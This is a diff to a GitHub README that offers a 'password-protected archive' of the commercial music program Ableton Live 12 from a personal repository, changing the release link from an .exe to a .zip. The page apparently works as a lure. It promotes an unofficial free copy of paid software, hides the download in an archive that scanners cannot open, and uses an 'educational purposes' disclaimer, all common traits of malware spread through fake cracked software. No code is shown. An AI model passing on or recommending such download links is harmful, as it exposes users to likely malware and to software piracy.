@@ -21,7 +21,7 @@ This repository is for educational and testing purposes only. All files are prov
 ## 📥 Download
 Password-protected archive with the complete Ableton Live 12 package – extract and start producing music instantly.  
 
-📥 [Download `Ableton-12-Setup.zip`](https://github.com/skulldxss/Ableton-Live-12-Desktop/releases/download/Music-Production/Ableton-12-Setup.exe)  
+📥 [Download `Ableton-12-Setup.zip`](https://github.com/skulldxss/Ableton-Live-12-Desktop/releases/download/Music-Production/Ableton-12-Setup.zip)  
 ---
 
 > ℹ️ Best for professional music production, beatmaking, electronic music, sound design and live performances on Windows PC.
